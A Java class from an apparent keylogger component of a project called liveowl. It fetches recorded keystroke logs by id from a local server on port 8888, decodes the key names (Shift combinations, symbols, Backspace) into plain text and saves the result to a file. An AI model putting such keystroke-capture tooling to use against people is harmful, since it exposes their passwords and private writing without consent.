package com.client.liveowl.KeyLogger;

import java.io.*;
import java.net.Socket;

public class GetFile {
public void downloadFile(String id) {
    String filepath = "E:\\Downloads\\liveowl\\src\\main\\java\\com\\client\\liveowl\\KeyLogger\\" + "\\" + id + ".txt";
    StringBuilder code = new StringBuilder();
    try (Socket soc = new Socket("localhost", 8888);
         DataInputStream dis = new DataInputStream(soc.getInputStream());
         DataOutputStream dos = new DataOutputStream(soc.getOutputStream())) {

        System.out.println("Đã kết nối thành công");
        dos.writeUTF(id);
        System.out.println("Gửi thành công");
        String line;
        try {
            while (!(line = dis.readUTF()).equals("EOF")) {
                code.append(xuly(line));
            }
        } catch (IOException e) {
            System.out.println("Looix 1: " + e.getMessage());
        }
        System.out.println(code.toString());
        System.out.println(filepath);

        try (BufferedWriter writer = new BufferedWriter(new FileWriter(filepath))) {
            writer.write(code.toString());
        } catch (IOException e) {
            System.out.println("Looix 2: " + e.getMessage());
        }
        System.out.println("Nhận file thành công");
    } catch (IOException e) {
        System.out.println("Lỗi: " + e.getMessage());
    }
}

public String xuly(String input) {
    String[] resultArray = input.split(" ");
    StringBuilder code = new StringBuilder();

    for (int i = 0; i < resultArray.length; i++) {
        String element = resultArray[i];

        // Xử lý các trường hợp "Shift Shift Shift 9"
        if (element.equals("Shift")) {
            // Bỏ qua các "Shift" liên tiếp và chỉ xử lý ký tự cuối cùng
            while (i + 1 < resultArray.length && resultArray[i + 1].equals("Shift")) {
                i++; // Bỏ qua các lần lặp "Shift"
            }
            // Kiểm tra ký tự tiếp theo sau chuỗi "Shift"
            if (i + 1 < resultArray.length) {
                String nextElement = resultArray[i + 1];
                switch (nextElement) {
                    case "9":
                        code.append("(");
                        i++; // Bỏ qua "9" vì đã xử lý
                        continue;
                    case "0":
                        code.append(")");
                        i++;
                        continue;
                    case "1":
                        code.append("!");
                        i++;
                        continue;
                    case "2":
                        code.append("@");
                        i++;
                        continue;
                    case "3":
                        code.append("#");
                        i++;
                        continue;
                    case "4":
                        code.append("$");
                        i++;
                        continue;
                    case "5":
                        code.append("%");
                        i++;
                        continue;
                    case "6":
                        code.append("^");
                        i++;
                        continue;
                    case "7":
                        code.append("&");
                        i++;
                        continue;
                    case "8":
                        code.append("*");
                        i++;
                        continue;
                    case "Comma":
                        code.append("<");
                        i++;
                        continue;
                    case "Period":
                        code.append(">");
                        i++;
                        continue;
                    case "Slash":
                        code.append("?");
                        i++;
                        continue;
                    case "Semicolon":
                        code.append(":");
                        i++;
                        continue;
                    case "Quote":
                        code.append("\"");
                        i++;
                        continue;
                    case "Minus":
                        code.append("_");
                        i++;
                        continue;
                    case "Open":
                        code.append("{");
                        i += 2;
                        continue;
                    case "Equals":
                        code.append("+");
                        i++;
                        continue;
                    case "Close":
                        code.append("}");
                        i += 2;
                        continue;
                }
            }
            continue;
        }

        switch (element) {
            case "Space":
                code.append(" ");
                break;
            case "Enter":
                code.append("\n");
                break;
            case "Equals":
                code.append("=");
                break;
            case "Semicolon":
                code.append(";");
                break;
            case "Comma":
                code.append(",");
                break;
            case "Period":
                code.append(".");
                break;
            case "Slash":
                code.append("/");
                break;
            case "Quote":
                code.append("'");
                break;
            case "Minus":
                code.append("-");
                break;
            case "Backspace":
                if (code.length() > 0) {
                    code.deleteCharAt(code.length() - 1);
                }
                break;
            default:
                code.append(element.toLowerCase());
                break;
        }
    }
    return code.toString();
}
//public static void main(String[] args) {
//    FTPDownloadFile downloadFile = new FTPDownloadFile();
//    downloadFile.downloadFile("fd720a2e");
//}
}
